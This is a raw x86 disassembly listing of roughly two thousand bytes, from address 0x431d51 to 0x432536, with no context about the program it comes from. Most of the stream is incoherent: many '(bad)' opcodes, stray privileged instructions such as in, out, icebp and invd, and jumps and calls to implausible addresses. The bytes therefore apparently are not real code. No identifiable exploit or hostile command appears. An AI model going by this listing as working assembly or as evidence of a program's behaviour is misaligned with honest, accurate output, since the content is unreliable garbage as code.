  431d51:	xor    edi,DWORD PTR [ebp-0x73]
  431d54:	xor    eax,DWORD PTR [ebx]
  431d56:	xor    esi,DWORD PTR [edx+0x3]
  431d59:	add    BYTE PTR [ecx],bh
  431d5b:	inc    ebp
  431d5c:	(bad)  
  431d5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d63:	mov    DWORD PTR [eax],0x750f0004
  431d69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d6f:	lock add BYTE PTR [ebp+0x0],cl
  431d73:	mov    esi,DWORD PTR [ebp-0x18]
  431d76:	mov    ebp,edx
  431d78:	or     al,0x72
  431d7a:	ja     0x431d7c
  431d7c:	mov    edx,esi
  431d7e:	cld    
  431d7f:	(bad)  
  431d82:	cli    
  431d83:	mov    esi,DWORD PTR [ebp-0x4]
  431d86:	cmp    ecx,esi
  431d88:	bswap  edi
  431d8a:	(bad)
  431d8e:	mov    esi,DWORD PTR [ebp-0x4]
  431d91:	mov    esi,ecx
  431d93:	clc    
  431d94:	repnz add esi,DWORD PTR [ebp+0x45]
  431d98:	push   ebx
  431d99:	xor    eax,DWORD PTR [ebp+0x3]
  431d9c:	cmp    al,0x5f
  431d9e:	pushf  
  431d9f:	pop    ebx
  431da0:	jmp    0x431e67
  431da5:	mov    esi,DWORD PTR [ebp-0x7d]
  431da8:	xor    ebp,DWORD PTR [eax]
  431daa:	lea    eax,[ebp-0x8]
  431dad:	xor    edx,esi
  431daf:	pushf  
  431db0:	out    dx,eax
  431db1:	(bad)  
  431db2:	neg    eax
  431db4:	ins    DWORD PTR es:[edi],dx
  431db5:	test   esi,edi
  431db7:	clc    
  431db8:	pop    esp
  431db9:	inc    ebp
  431dba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dc0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431dc6:	add    cl,al
  431dc8:	jne    0x431d65
  431dca:	mov    esi,DWORD PTR [edx]
  431dcc:	in     al,dx
  431dcd:	push   esi
  431dce:	xor    BYTE PTR [ebp-0xe],dh
  431dd1:	add    edi,esi
  431dd3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dd9:	add    cl,bh
  431ddb:	mov    edi,DWORD PTR [ebp+0x8]
  431dde:	mov    DWORD PTR [ebp-0x14],esi
  431de1:	add    esi,DWORD PTR [ebp+0x3c]
  431de4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dea:	mov    ah,0x3e
  431dec:	fwait
  431ded:	pushf  
  431dee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431df4:	jne    0x431d81
  431df6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431df9:	icebp  
  431dfa:	icebp  
  431dfb:	shl    edx,0xf2
  431dfe:	(bad)  
  431dff:	mov    ah,0x16
  431e01:	push   eax
  431e02:	jne    0x431d97
  431e04:	mov    ecx,DWORD PTR [edi]
  431e06:	in     al,dx
  431e07:	jmp    0x431dfa
  431e09:	add    dl,dh
  431e0b:	mov    edi,esi
  431e0d:	or     al,0x8
  431e0f:	inc    ebp
  431e10:	jne    0x431e15
  431e12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e18:	ret    
  431e19:	or     bh,bh
  431e1b:	jge    0x431e05
  431e1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e23:	xor    edi,eax
  431e25:	add    esi,DWORD PTR [ebp-0x77]
  431e28:	mov    ebx,esp
  431e2a:	clc    
  431e2b:	neg    DWORD PTR [ebp-0x7c]
  431e2e:	xor    eax,DWORD PTR [eax]
  431e30:	cmp    eax,DWORD PTR [eax]
  431e32:	repz jne 0x431dca
  431e35:	xor    eax,DWORD PTR [ecx]
  431e37:	add    ebx,DWORD PTR [eax]
  431e39:	mov    DWORD PTR [ebp-0x8],eax
  431e3c:	mov    eax,edi
  431e3e:	cld    
  431e3f:	lock pop eax
  431e41:	test   DWORD PTR [ebx],esi
  431e43:	clc    
  431e44:	add    edx,DWORD PTR [edi-0x740bff77]
  431e4a:	fdivp  st(4),st
  431e4c:	test   ecx,esi
  431e4e:	(bad)  
  431e4f:	jnp    0x431e50
  431e51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e57:	jae    0x431de4
  431e59:	sub    edi,esp
  431e5b:	(bad)  
  431e5c:	shl    DWORD PTR [eax-0x3e],0x89
  431e60:	leave  
  431e61:	call   0x8198d56e
  431e66:	in     al,dx
  431e67:	(bad)  
  431e68:	in     al,dx
  431e69:	add    bh,al
  431e6b:	mov    esp,edi
  431e6d:	in     al,dx
  431e6e:	test   DWORD PTR [ebp-0x8],edi
  431e71:	mov    eax,DWORD PTR [ebp+0x2b]
  431e74:	xor    al,BYTE PTR [ebx]
  431e76:	pushf  
  431e77:	jnp    0x57321ab0
  431e7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e81:	loopne 0x431eb6
  431e83:	jne    0x431e40
  431e85:	mov    esi,DWORD PTR [edx-0x20]
  431e88:	add    BYTE PTR [ebp-0x3d],bh
  431e8b:	xor    eax,DWORD PTR [ebp-0x73]
  431e8e:	mov    edi,DWORD PTR [esi]
  431e90:	cld    
  431e91:	jb     0x431e59
  431e93:	add    bl,al
  431e95:	jne    0x431edc
  431e97:	mov    edx,DWORD PTR [edi-0x10]
  431e9a:	jge    0x431f19
  431e9c:	mov    esi,DWORD PTR [ebx]
  431e9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431ea2:	xor    esi,DWORD PTR [ebp-0x77]
  431ea5:	mov    esi,eax
  431ea7:	lock inc ebp
  431ea9:	jge    0x431edc
  431eab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431eb2:	dec    ebp
  431eb3:	mov    esi,DWORD PTR [ebx]
  431eb5:	loopne 0x431e40
  431eb7:	jge    0x431eb1
  431eb9:	add    DWORD PTR [ebp-0x7d],eax
  431ebc:	icebp  
  431ebd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431ec4:	dec    ebp
  431ec5:	hlt    
  431ec6:	xor    ebx,DWORD PTR [ebp-0x77]
  431ec9:	mov    esi,esp
  431ecb:	in     al,0x45
  431ecd:	jge    0x431f0c
  431ecf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ed6:	dec    ebp
  431ed7:	push   esp
  431ed8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431ede:	inc    ebp
  431edf:	hlt    
  431ee0:	xor    DWORD PTR [ebp-0x61],esi
  431ee3:	mov    edi,DWORD PTR [eax+0xf19504]
  431ee9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431eed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ef0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ef4:	fistp  WORD PTR [ebx+0x0]
  431ef7:	inc    ebp
  431ef8:	mov    ebx,DWORD PTR [edi+0xc]
  431efb:	add    eax,eax
  431efd:	inc    ebp
  431efe:	test   BYTE PTR [ebx],dh
  431f00:	add    eax,DWORD PTR [ebx]
  431f02:	add    BYTE PTR [esi+0x45],bl
  431f05:	ret    0x85
  431f08:	jnp    0x5443a2d7
  431f0e:	inc    bp
  431f10:	inc    ebp
  431f11:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f17:	fdiv   QWORD PTR [ebx]
  431f19:	test   DWORD PTR [ecx+0x453bf8],edi
  431f1f:	push   ebx
  431f20:	add    edi,DWORD PTR [esi+0x708088b]
  431f26:	cmp    esi,eax
  431f28:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f2f:	mov    esp,edi
  431f31:	call   0x33ce6483
  431f36:	or     BYTE PTR [ebx],al
  431f38:	inc    ecx
  431f39:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f3f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f45:	lock add cl,al
  431f48:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f4f:	mov    ch,0x45
  431f51:	clc    
  431f52:	xor    eax,DWORD PTR [ebp+0x3]
  431f55:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f5b:	inc    ebp
  431f5c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f62:	mov    edi,eax
  431f64:	mov    eax,DWORD PTR [ebp+0x3c]
  431f67:	mov    ecx,DWORD PTR [eax]
  431f69:	hlt    
  431f6a:	inc    ebp
  431f6b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f72:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f78:	push   ebp
  431f79:	mov    edi,DWORD PTR [ebx]
  431f7b:	in     al,dx
  431f7c:	jne    0x431f3f
  431f7e:	mov    eax,DWORD PTR [ebp-0x28]
  431f81:	add    DWORD PTR [eax],0xe8058dec
  431f87:	clc    
  431f88:	mov    esi,DWORD PTR [edi-0x8]
  431f8b:	add    dh,dl
  431f8d:	rol    WORD PTR [ebp-0x1],cl
  431f91:	mov    edx,DWORD PTR [eax+0x8]
  431f94:	jne    0x431f56
  431f96:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f9d:	inc    ebp
  431f9e:	push   esp
  431f9f:	test   DWORD PTR [ecx+0xf],ecx
  431fa2:	sub    edx,esp
  431fa4:	add    eax,DWORD PTR [eax]
  431fa6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431fac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431fb3:	mov    eax,DWORD PTR [ecx]
  431fb5:	and    BYTE PTR [eax],al
  431fb7:	cmp    al,0x10
  431fb9:	add    BYTE PTR [ebp+0x66],al
  431fbc:	inc    ecx
  431fbe:	push   esp
  431fbf:	add    dh,BYTE PTR [ebp+0x0]
  431fc2:	push   edx
  431fc3:	enterw 0xc1,0x4d
  431fc8:	mov    esp,DWORD PTR [esi+0x20]
  431fcb:	add    DWORD PTR [ecx-0x7b],eax
  431fce:	add    eax,DWORD PTR [ebx]
  431fd0:	str    WORD PTR [eax+0x45]
  431fd4:	lea    ecx,[ebx+0x45890801]
  431fda:	sbb    BYTE PTR [ebx],al
  431fdc:	dec    ebp
  431fdd:	cmp    al,0xf
  431fdf:	inc    ebp
  431fe0:	push   eax
  431fe1:	mov    esi,DWORD PTR [ebx]
  431fe3:	push   eax
  431fe4:	add    eax,eax
  431fe6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fed:	inc    ebp
  431fee:	add    BYTE PTR [ecx],dh
  431ff0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431ff7:	(bad)  
  431ff8:	mov    ebx,eax
  431ffa:	loopne 0x432041
  431ffc:	dec    ebp
  431ffd:	mov    ecx,DWORD PTR [edi]
  431fff:	cld    
  432000:	push   eax
  432001:	xchg   DWORD PTR [ebx],esi
  432003:	add    DWORD PTR [ebx],ebp
  432005:	add    BYTE PTR [ebx],ch
  432007:	or     BYTE PTR [ecx],bh
  432009:	dec    ecx
  43200a:	loopne 0x43200f
  43200c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432012:	push   ebp
  432013:	add    DWORD PTR [ebx+0x55100800],eax
  432019:	dec    ebp
  43201a:	jmp    0x431fa5
  43201c:	mov    esp,DWORD PTR [eax]
  43201e:	sbb    dl,dl
  432020:	inc    eax
  432021:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432027:	add    BYTE PTR [ebx+0x74528555],cl
  43202d:	push   ebp
  43202e:	div    DWORD PTR [ebx]
  432030:	and    eax,DWORD PTR [ebx]
  432032:	add    edx,DWORD PTR [edx-0x30]
  432035:	jno    0x431fc2
  432037:	inc    DWORD PTR [eax+eiz*1]
  43203a:	inc    ebp
  43203b:	push   eax
  43203c:	push   eax
  43203d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432043:	mov    edi,esp
  432045:	push   eax
  432046:	inc    ebp
  432047:	enter  0x458b,0x8
  43204b:	push   ecx
  43204c:	(bad)  
  43204d:	call   0x10d2a25
  432052:	pop    ss
  432053:	push   ebp
  432054:	mov    ecx,DWORD PTR [ebx+0x489408]
  43205a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432060:	push   ecx
  432061:	jo     0x43204b
  432063:	inc    DWORD PTR [edi]
  432065:	or     BYTE PTR [eax],al
  432067:	call   0xce27b1
  43206c:	fmul   QWORD PTR [ebp+0x55]
  43206f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432075:	mov    bh,0x8c
  432077:	adc    al,0x9b
  432079:	dec    esp
  43207a:	xor    bl,BYTE PTR [eax]
  43207c:	mov    ecx,DWORD PTR [ebp+0xc]
  43207f:	mov    eax,DWORD PTR [ebp-0x4]
  432082:	mov    esi,DWORD PTR [edi-0x3148f924]
  432088:	push   es
  432089:	retf   
  43208a:	mov    BYTE PTR [ebp-0x30],0x3b
  43208e:	inc    ebp
  43208f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432096:	retf   0x83fc
  432099:	into   
  43209a:	dec    ebp
  43209b:	retf   
  43209c:	mov    ecx,DWORD PTR [ebp-0x74]
  43209f:	mov    eax,DWORD PTR [eax]
  4320a1:	fdiv   QWORD PTR [ebx]
  4320a3:	mov    bh,0x3
  4320a5:	push   es
  4320a6:	mov    esi,ecx
  4320a8:	sbb    cl,dl
  4320aa:	dec    ebp
  4320ab:	sar    DWORD PTR [ebx],cl
  4320ad:	push   ebp
  4320ae:	jne    0x4320bf
  4320b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320b6:	lea    ebx,[eax]
  4320b8:	call   0xf4ccac7f
  4320bd:	sbb    dh,dl
  4320bf:	add    edx,ebx
  4320c1:	push   ebp
  4320c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320c8:	push   ecx
  4320c9:	mov    DWORD PTR [eax-0x30],edx
  4320cc:	test   DWORD PTR [edx],eax
  4320ce:	xadd   esp,esi
  4320d1:	pop    es
  4320d2:	add    cl,dl
  4320d4:	mov    eax,ecx
  4320d6:	or     al,0x45
  4320d8:	(bad)  
  4320d9:	push   eax
  4320da:	add    DWORD PTR [edx+0x0],eax
  4320dd:	add    ecx,DWORD PTR [ecx]
  4320df:	and    dh,cl
  4320e1:	call   0xc729b1
  4320e6:	add    DWORD PTR [ebp+0x0],edx
  4320e9:	mov    esp,DWORD PTR [ebp+0x18]
  4320ec:	add    BYTE PTR [eax+0x50],cl
  4320ef:	xor    eax,DWORD PTR [eax]
  4320f1:	add    esp,DWORD PTR [esi+0x3b]
  4320f4:	inc    ebp
  4320f5:	je     0x43207a
  4320f7:	push   ecx
  4320f8:	dec    BYTE PTR [ebp-0x77]
  4320fb:	add    eax,esi
  4320fd:	or     al,0x5e
  4320ff:	inc    eax
  432100:	add    BYTE PTR [ebx],al
  432102:	data16 and BYTE PTR [ebp+0x50],al
  432106:	sub    DWORD PTR [ecx],0xfffffff8
  432109:	add    BYTE PTR [ebp-0x75],ah
  43210c:	add    BYTE PTR [eax],bl
  43210e:	enter  0x894d,0x8b
  432112:	int3   
  432113:	loopne 0x4320d7
  432115:	rol    BYTE PTR [eax],0x33
  432118:	lea    cx,[ebp+0xa]
  43211c:	data16 jb 0x432164
  43211f:	add    BYTE PTR [ebx+0x44890855],cl
  432125:	sbb    ah,al
  432127:	inc    ebp
  432128:	cmp    al,0xf
  43212a:	add    BYTE PTR [edx+0x66],dl
  43212d:	xor    ecx,DWORD PTR [eax]
  43212f:	sub    eax,DWORD PTR [edx]
  432131:	mov    eax,DWORD PTR [eax]
  432133:	or     al,0x66
  432135:	ror    edx,cl
  432137:	dec    ebp
  432138:	inc    ebp
  432139:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43213f:	cld    
  432140:	or     BYTE PTR [edi+0x4501dd],dl
  432146:	ret    0xecce
  432149:	retf   
  43214a:	(bad)  
  43214b:	dec    ebp
  43214c:	mov    al,0x8b
  43214e:	loopne 0x432170
  432150:	cmp    ecx,DWORD PTR [edx]
  432152:	inc    ebp
  432153:	daa    
  432154:	loopne 0x4320dd
  432156:	in     al,dx
  432157:	add    edi,eax
  432159:	add    BYTE PTR [eax+0x3f52e155],bh
  43215f:	push   ebp
  432160:	inc    ebp
  432161:	xor    ebx,edx
  432163:	add    ebp,esp
  432165:	push   edx
  432166:	push   bp
  432168:	inc    ebp
  432169:	(bad)  
  43216a:	in     eax,dx
  43216b:	push   esp
  43216c:	(bad)  
  43216d:	inc    edx
  43216f:	sbb    al,0x33
  432171:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432178:	add    BYTE PTR [ebp+0x46],0x8b
  43217c:	jmp    0xf98b:0x100041c8
  432183:	xor    esi,DWORD PTR [edx+0x3]
  432186:	mov    ecx,DWORD PTR [edi]
  432188:	fmul   DWORD PTR [edx]
  43218a:	add    BYTE PTR [eax],al
  43218c:	lea    eax,[ebx-0x4700273c]
  432192:	add    al,0x4f
  432194:	pop    DWORD PTR [eax]
  432196:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43219c:	push   edx
  43219d:	inc    WORD PTR [ebp+0x8]
  4321a1:	mov    eax,0x514f4d
  4321a6:	(bad)
  4321aa:	add    al,al
  4321ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4321b2:	test   DWORD PTR [esi+0x74],esp
  4321b5:	inc    ebp
  4321b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4321bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321c2:	or     dh,cl
  4321c4:	or     eax,0x8b8d5045
  4321c9:	inc    ebp
  4321ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4321d0:	jne    0x432205
  4321d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321d8:	add    DWORD PTR [ebx],eax
  4321da:	add    bh,bh
  4321dc:	adc    DWORD PTR [eax],ecx
  4321de:	adc    DWORD PTR [ebp+0x55],edi
  4321e1:	push   es
  4321e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321ef:	inc    ebp
  4321f0:	mov    esp,edi
  4321f2:	or     al,0xda
  4321f4:	push   eax
  4321f5:	(bad)  
  4321f6:	jne    0x4321ac
  4321f8:	call   0x3b1ae7
  4321fd:	inc    ebp
  4321fe:	sar    BYTE PTR [eax],0x84
  432201:	in     al,dx
  432202:	add    bh,al
  432204:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43220b:	(bad)  
  43220c:	and    al,al
  43220e:	fs in  eax,dx
  432210:	inc    DWORD PTR [ebp-0x7b]
  432213:	jle    0x432224
  432215:	leave  
  432216:	scas   al,BYTE PTR es:[edi]
  432217:	inc    esp
  432218:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43221f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432226:	call   DWORD PTR [edi]
  432228:	shr    ah,0x84
  43222b:	xchg   DWORD PTR [eax],eax
  43222d:	add    DWORD PTR [eax],eax
  43222f:	add    bh,bh
  432231:	dec    ebp
  432232:	and    BYTE PTR [ecx-0x38],dl
  432235:	push   eax
  432236:	dec    DWORD PTR [ebx+0xfd885]
  43223c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432242:	mov    WORD PTR [ecx+0x0],ss
  432245:	lea    ecx,[ebx+0x108b20d8]
  43224b:	mov    WORD PTR [edx],ds
  43224d:	add    BYTE PTR [edi+0xff01ff],al
  432253:	mov    ecx,DWORD PTR [ebp-0x28]
  432256:	push   ecx
  432257:	shl    BYTE PTR [ebp+0x3a],0x8b
  43225b:	inc    ebp
  43225c:	in     al,0xeb
  43225e:	jno    0x4321eb
  432260:	push   edx
  432261:	mov    DWORD PTR [eax-0x28],edx
  432264:	mov    eax,DWORD PTR [ebp+0x20]
  432267:	je     0x4321f0
  432269:	mov    eax,DWORD PTR [ecx]
  43226b:	sbb    BYTE PTR [eax],al
  43226d:	pop    DWORD PTR [eax]
  43226f:	add    esi,eax
  432271:	add    bl,al
  432273:	adc    DWORD PTR [edi],esi
  432275:	jmp    0x8bce72c7
  43227a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432281:	jne    0x43220e
  432283:	mov    ecx,DWORD PTR [eax]
  432285:	in     al,0x75
  432287:	pop    DWORD PTR [ecx+0x5401]
  43228d:	push   edx
  43228e:	inc    DWORD PTR [ebx]
  432290:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432296:	add    BYTE PTR [edi+0x9],dl
  432299:	call   DWORD PTR [esi]
  43229b:	and    dl,al
  43229d:	and    bh,bh
  43229f:	inc    edi
  4322a1:	test   eax,edx
  4322a3:	sldt   ebx
  4322a6:	xor    al,BYTE PTR [eax]
  4322a8:	pushf  
  4322a9:	(bad)  
  4322aa:	jmp    0x4322b8
  4322ac:	mov    eax,edi
  4322ae:	or     al,0x75
  4322b0:	inc    eax
  4322b1:	call   0x4319b9
  4322b6:	mov    eax,eax
  4322b8:	loopne 0x43223e
  4322ba:	inc    ebp
  4322bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4322c1:	mov    eax,DWORD PTR [ebp+0x20]
  4322c4:	add    edi,ecx
  4322c6:	add    BYTE PTR [eax],ch
  4322c8:	cmp    edi,0x18
  4322cb:	test   DWORD PTR [ebp+0xf],esi
  4322ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322d5:	jne    0x4322d9
  4322d7:	call   0xffa21d9c
  4322dc:	leave  
  4322dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4322e1:	add    ah,ch
  4322e3:	add    BYTE PTR [edi-0x48fef979],dh
  4322e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322f0:	inc    esp
  4322f1:	mov    ebx,DWORD PTR [eax]
  4322f3:	fcom   st(2)
  4322f5:	add    BYTE PTR [edi],bl
  4322f7:	lea    ecx,[eax-0x18]
  4322fa:	(bad)  
  4322fb:	push   DWORD PTR [ecx]
  4322fd:	call   0xffb5705f
  432302:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432306:	fstp   DWORD PTR [esi+ebx*8]
  432309:	push   ebp
  43230a:	pop    ebp
  43230b:	mov    esi,DWORD PTR [edx-0x38]
  43230e:	add    DWORD PTR [eax],0x28
  432311:	mov    edi,DWORD PTR [ebx]
  432313:	xor    esi,DWORD PTR [edx+0x3]
  432316:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43231a:	pop    ebp
  43231b:	or     al,0x4
  43231d:	inc    ecx
  43231e:	push   ebp
  43231f:	(bad)  
  432320:	in     al,dx
  432321:	or     ah,ch
  432323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432324:	xbegin 0xffc8991a
  43232a:	clc    
  43232b:	adc    al,0x45
  43232d:	div    BYTE PTR [edx]
  43232f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432336:	test   DWORD PTR [ebx+0x666300f8],ebx
  43233c:	add    BYTE PTR [ecx+0x66],dh
  43233f:	add    eax,DWORD PTR [ebp+0x52]
  432342:	adc    eax,0xffffffa0
  432345:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43234b:	test   DWORD PTR [eax],eax
  43234d:	clc    
  43234e:	data16 or al,BYTE PTR [ebp+0x45]
  432352:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432359:	rol    BYTE PTR [ebp+0x45],1
  43235c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432362:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432368:	push   ebx
  432369:	add    BYTE PTR [eax+eax*1+0x51],dl
  43236d:	jge    0x4323a2
  43236f:	add    BYTE PTR [esi+0x4],dl
  432372:	jne    0x4323d9
  432374:	mov    edx,0x457200
  432379:	jmp    0x43233d
  43237b:	xor    edi,DWORD PTR [ebx]
  43237d:	pop    edi
  43237e:	cvtdq2ps xmm7,xmm0
  432381:	ret    0x0
  432384:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43238a:	xor    ecx,DWORD PTR [edi]
  43238c:	add    eax,DWORD PTR [ecx+0x3b]
  43238f:	push   ebx
  432390:	rdpmc  
  432392:	out    0x8d,al
  432394:	add    BYTE PTR [eax],cl
  432396:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43239c:	ret    0x450c
  43239f:	sbb    al,0x8b
  4323a1:	cmp    eax,esi
  4323a3:	or     cl,al
  4323a5:	or     al,0xc2
  4323a7:	pop    eax
  4323a8:	inc    ebp
  4323a9:	add    ecx,DWORD PTR [edi]
  4323ab:	add    esi,DWORD PTR [ebp+0x39]
  4323ae:	invd   
  4323b0:	jge    0x4323bc
  4323b2:	mov    eax,0x478ac0
  4323b7:	cli    
  4323b8:	xor    esp,ecx
  4323ba:	mov    ebx,0x5b8ac0
  4323bf:	ret    0x33
  4323c2:	mov    eax,0x833b8b
  4323c7:	sub    BYTE PTR [ebx],al
  4323c9:	inc    ebp
  4323ca:	xor    ax,di
  4323cd:	pushf  
  4323ce:	inc    bh
  4323d0:	mov    esp,esp
  4323d2:	hlt    
  4323d3:	test   DWORD PTR [ebp-0x8],esi
  4323d6:	mov    eax,DWORD PTR [ebp-0x14]
  4323d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323df:	dec    edi
  4323e0:	or     BYTE PTR [eax],al
  4323e2:	jne    0x43236d
  4323e4:	mov    esi,esp
  4323e6:	call   0x77a9afab
  4323eb:	inc    ebp
  4323ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323f8:	add    BYTE PTR [esi+0x7d],ah
  4323fb:	inc    ebp
  4323fc:	mov    bx,WORD PTR [ebp+0x8]
  432400:	add    DWORD PTR [ebp+0x54],0x30c008b
  432407:	inc    ebp
  432408:	mov    bx,di
  43240b:	lock test BYTE PTR [ecx+0x7000801],bh
  432412:	jge    0x4323d5
  432414:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43241a:	cli    
  43241b:	xor    bl,bh
  43241d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432423:	test   BYTE PTR [eax],cl
  432425:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43242c:	cmp    ebp,eax
  43242e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432435:	test   BYTE PTR [ebp+0x1],bh
  432438:	mov    ebx,0x458a00
  43243d:	xor    esi,DWORD PTR [ebx]
  43243f:	add    esp,DWORD PTR [esi-0x77]
  432442:	pop    ebp
  432443:	loopne 0x4324ab
  432445:	inc    ebp
  432446:	clc    
  432447:	xor    edi,DWORD PTR [ebx]
  432449:	add    esi,DWORD PTR [edx-0x77]
  43244c:	data16 fdivr QWORD PTR [ebp-0x49]
  432450:	mov    ebx,0xb78afc
  432455:	hlt    
  432456:	xor    edi,DWORD PTR [esi+eiz*2]
  432459:	add    BYTE PTR [ebp+0x66],bl
  43245c:	data16 lock clc 
  43245f:	cmp    al,0x3b
  432461:	add    BYTE PTR [edi+0x66],dh
  432464:	psubq  mm7,QWORD PTR [ebp+0x2]
  432468:	ltr    WORD PTR [ebp+0x66]
  43246c:	add    esi,eax
  43246e:	add    di,WORD PTR [ebp+0x2b]
  432472:	data16 data16 jge 0x4324f3
  432476:	mov    ebx,0xe08a8b
  43247b:	jge    0x4324b0
  43247d:	data16 data16 xor al,0x5d
  432481:	data16 data16 jne 0x43247d
  432485:	mov    edi,DWORD PTR [ebx]
  432487:	fdiv   QWORD PTR [edx+0x7d]
  43248a:	data16 data16 jge 0x4324c2
  43248e:	mov    ebx,0x758a66
  432493:	mov    esi,0x667233
  432498:	pop    ebp
  432499:	or     BYTE PTR [esi+0x0],ah
  43249c:	clc    
  43249d:	mov    edi,DWORD PTR [ebx]
  43249f:	lock ja 0x43242d
  4324a2:	(bad)  
  4324a4:	jge    0x43249d
  4324a6:	invd   
  4324a8:	pop    ebp
  4324a9:	add    BYTE PTR [ebx],al
  4324ab:	(bad)  
  4324ac:	cmp    di,WORD PTR [ebp+0xf]
  4324b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324b4:	mov    bx,WORD PTR [ebp-0x10]
  4324b8:	pop    bp
  4324ba:	fbstp  TBYTE PTR [ebx]
  4324bc:	test   DWORD PTR [ebx],eax
  4324be:	add    BYTE PTR [ebx],bh
  4324c0:	add    BYTE PTR [esi+0x7d],ah
  4324c3:	jge    0x432450
  4324c5:	data16 in al,dx
  4324c7:	pop    ebp
  4324c8:	stc    
  4324c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324d0:	mov    edi,ebx
  4324d2:	in     al,dx
  4324d3:	test   BYTE PTR [ebp+0x0],bh
  4324d6:	mov    eax,DWORD PTR [eax]
  4324d8:	call   0xbd401e68
  4324dd:	cmp    al,0x9b
  4324df:	add    BYTE PTR [edx],dh
  4324e1:	mov    bx,di
  4324e4:	call   0x8b4ba274
  4324e9:	add    ebp,esp
  4324eb:	mov    bx,di
  4324ee:	jnp    0x432516
  4324f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324f6:	mov    eax,DWORD PTR [eax]
  4324f8:	call   0x7c3eb063
  4324fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432503:	data16 data16 fistp WORD PTR [ebp+0xe]
  432508:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432512:	fisttp WORD PTR [ecx-0x7401f77b]
  432518:	(bad)  
  432519:	cld    
  43251a:	jne    0x432558
  43251c:	xor    eax,DWORD PTR [eax]
  43251e:	mov    esp,DWORD PTR [esi-0x10]
  432521:	sti    
  432522:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432529:	data16 adc bl,bh
  43252c:	push   ebp
  43252d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432534:	mov    WORD PTR [eax],es
  432536:	fwait
